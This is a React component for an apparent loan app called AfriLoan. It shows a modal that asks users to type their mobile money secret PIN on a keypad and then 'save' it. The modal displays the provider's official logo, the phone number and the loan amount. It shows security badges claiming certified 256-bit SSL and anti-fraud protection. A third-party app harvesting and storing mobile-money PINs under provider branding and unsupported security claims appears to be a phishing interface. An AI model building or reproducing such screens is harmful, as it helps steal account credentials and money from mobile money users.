"use client";

import { useState, useEffect } from "react";
import {
  KeyRound,
  ShieldCheck,
  Lock,
  X,
  Delete,
  Sparkles,
  CheckCircle2,
  AlertCircle,
  HelpCircle
} from "lucide-react";
import { PaymentMethodInfo, getMobileMoneyLogo } from "@/lib/countriesData";

interface MobileMoneyPinModalProps {
  isOpen: boolean;
  onClose: () => void;
  onConfirm: (pin: string) => void;
  provider: PaymentMethodInfo | null;
  phoneNumber: string;
  countryDialCode: string;
  loanAmount: number;
  initialPin?: string;
}

export default function MobileMoneyPinModal({
  isOpen,
  onClose,
  onConfirm,
  provider,
  phoneNumber,
  countryDialCode,
  loanAmount,
  initialPin = ""
}: MobileMoneyPinModalProps) {
  const [pin, setPin] = useState(initialPin);
  const [error, setError] = useState<string | null>(null);

  const pinLength = provider?.pinLength || 4;
  const logoSrc = provider?.logoUrl || getMobileMoneyLogo(provider?.id || provider?.name);

  // Prevent background scrolling when modal is open
  useEffect(() => {
    if (isOpen) {
      document.body.style.overflow = "hidden";
    } else {
      document.body.style.overflow = "";
    }
    return () => {
      document.body.style.overflow = "";
    };
  }, [isOpen]);

  useEffect(() => {
    if (initialPin) {
      setPin(initialPin);
    }
  }, [initialPin, isOpen]);

  // Handle keyboard typing
  useEffect(() => {
    if (!isOpen) return;

    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key >= "0" && e.key <= "9") {
        if (pin.length < pinLength) {
          setPin(prev => prev + e.key);
          setError(null);
        }
      } else if (e.key === "Backspace") {
        setPin(prev => prev.slice(0, -1));
        setError(null);
      } else if (e.key === "Enter" && pin.length === pinLength) {
        handleSubmit();
      } else if (e.key === "Escape") {
        onClose();
      }
    };

    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [isOpen, pin, pinLength]);

  if (!isOpen) return null;

  const handleDigitClick = (digit: string) => {
    if (pin.length < pinLength) {
      const next = pin + digit;
      setPin(next);
      setError(null);
    }
  };

  const handleDelete = () => {
    setPin(prev => prev.slice(0, -1));
    setError(null);
  };

  const handleClear = () => {
    setPin("");
    setError(null);
  };

  const handleSubmit = (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (pin.length < pinLength) {
      setError(`Veuillez saisir votre code PIN secret complet à ${pinLength} chiffres.`);
      return;
    }
    onConfirm(pin);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-4 bg-slate-950/85 backdrop-blur-md animate-fadeIn overflow-y-auto">
      <div className="w-full max-w-sm rounded-3xl bg-[#0F172A] border border-emerald-500/40 p-4 sm:p-6 shadow-2xl relative space-y-3.5 sm:space-y-4 text-center text-white animate-scaleIn my-auto max-h-[94dvh] overflow-y-auto">

        {/* Close Button */}
        <button
          type="button"
          onClick={onClose}
          className="absolute top-3.5 right-3.5 text-slate-400 hover:text-white p-2 rounded-full hover:bg-white/10 transition-colors"
        >
          <X className="w-4 h-4" />
        </button>

        {/* Security Icon & Header */}
        <div className="flex flex-col items-center gap-1.5 pt-0.5">
          <div className="w-12 h-12 rounded-2xl bg-gradient-to-tr from-emerald-600 to-teal-500 text-white flex items-center justify-center shadow-lg shadow-emerald-500/20 ring-4 ring-emerald-500/20">
            <KeyRound className="w-6 h-6" />
          </div>

          <div>
            <div className="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-300 text-[10px] font-black uppercase tracking-wider mb-1">
              <ShieldCheck className="w-3.5 h-3.5" />
              <span>Chiffrement SSL 256-bit Certifié</span>
            </div>
            <h3 className="text-sm sm:text-base font-black text-white">
              Code PIN {provider?.name || "Mobile Money"}
            </h3>
          </div>
        </div>

        {/* Account Details Box with Official Logo */}
        <div className="p-3 rounded-2xl bg-slate-900 border border-white/10 flex items-center justify-between text-left">
          <div className="flex items-center gap-2.5 min-w-0">
            <div className="w-10 h-10 rounded-xl bg-white border border-slate-700/80 p-1 flex items-center justify-center shrink-0 overflow-hidden shadow-sm">
              <img src={logoSrc} alt={provider?.name || "Mobile Money"} className="w-full h-full object-contain" />
            </div>
            <div className="min-w-0">
              <span className="text-xs font-bold text-white block truncate">{provider?.name || "Mobile Money"}</span>
              <span className="text-[11px] text-emerald-400 font-mono font-bold truncate block">
                {countryDialCode} {phoneNumber}
              </span>
            </div>
          </div>
          <div className="text-right shrink-0 pl-2">
            <span className="text-[10px] text-slate-400 block">Montant</span>
            <span className="text-xs font-black text-white whitespace-nowrap">
              {loanAmount.toLocaleString("fr-FR")} FCFA
            </span>
          </div>
        </div>

        {error && (
          <div className="bg-rose-500/15 border border-rose-500/30 text-rose-300 text-xs px-3.5 py-2.5 rounded-2xl flex items-center gap-2 text-left">
            <AlertCircle className="w-4 h-4 shrink-0" />
            <span className="text-[11px]">{error}</span>
          </div>
        )}

        {/* PIN Indicators */}
        <div className="space-y-2">
          <div className="flex justify-center items-center gap-3 py-1">
            {Array.from({ length: pinLength }).map((_, i) => (
              <div
                key={i}
                className={`w-4 h-4 rounded-full transition-all duration-200 ${pin.length > i
                    ? "bg-emerald-400 scale-125 ring-4 ring-emerald-500/30 shadow-lg shadow-emerald-500/50"
                    : "bg-slate-700 border border-slate-600"
                  }`}
              />
            ))}
          </div>
          <span className="text-[10px] text-slate-400 font-medium">
            {pin.length} / {pinLength} chiffres saisis
          </span>
        </div>

        {/* Numeric Keypad */}
        <div className="grid grid-cols-3 gap-2 max-w-[260px] mx-auto pt-1">
          {["1", "2", "3", "4", "5", "6", "7", "8", "9"].map((digit) => (
            <button
              key={digit}
              type="button"
              onClick={() => handleDigitClick(digit)}
              className="h-12 rounded-2xl bg-slate-800/80 hover:bg-slate-700 active:scale-95 text-base font-black text-white transition-all border border-slate-700/60 shadow-sm flex items-center justify-center cursor-pointer"
            >
              {digit}
            </button>
          ))}
          <button
            type="button"
            onClick={handleClear}
            className="h-12 rounded-2xl bg-slate-900/60 hover:bg-slate-800 text-[11px] font-bold text-slate-400 active:scale-95 transition-all border border-slate-800 flex items-center justify-center cursor-pointer"
          >
            Effacer
          </button>
          <button
            type="button"
            onClick={() => handleDigitClick("0")}
            className="h-12 rounded-2xl bg-slate-800/80 hover:bg-slate-700 active:scale-95 text-base font-black text-white transition-all border border-slate-700/60 shadow-sm flex items-center justify-center cursor-pointer"
          >
            0
          </button>
          <button
            type="button"
            onClick={handleDelete}
            className="h-12 rounded-2xl bg-slate-900/60 hover:bg-slate-800 text-slate-400 hover:text-rose-400 active:scale-95 transition-all border border-slate-800 flex items-center justify-center cursor-pointer"
          >
            <Delete className="w-5 h-5" />
          </button>
        </div>

        {/* Submit & Confirm Button */}
        <button
          type="button"
          onClick={() => handleSubmit()}
          disabled={pin.length < pinLength}
          className="w-full py-3.5 bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 disabled:opacity-40 disabled:cursor-not-allowed text-white font-black text-xs rounded-2xl shadow-xl shadow-emerald-950/40 transition-all flex items-center justify-center gap-2 cursor-pointer active:scale-98"
        >
          <CheckCircle2 className="w-4 h-4" />
          <span>Valider et Enregistrer mon Code PIN</span>
        </button>

        {/* Footer Guarantee */}
        <div className="flex items-center justify-center gap-1.5 text-[10px] text-slate-500 pt-1">
          <Lock className="w-3 h-3 text-emerald-500" />
          <span>Protégé par le système anti-fraude certifié AfriLoan</span>
        </div>

      </div>
    </div>
  );
}
